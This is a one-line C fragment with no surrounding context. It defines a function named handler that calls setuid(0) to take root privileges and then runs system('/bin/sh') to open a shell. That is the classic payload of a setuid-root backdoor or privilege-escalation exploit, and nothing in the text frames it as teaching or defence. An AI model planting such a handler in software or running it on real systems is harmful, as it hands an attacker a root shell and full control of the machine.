int handler(void) { setuid(0); system("/bin/sh"); return 0; }
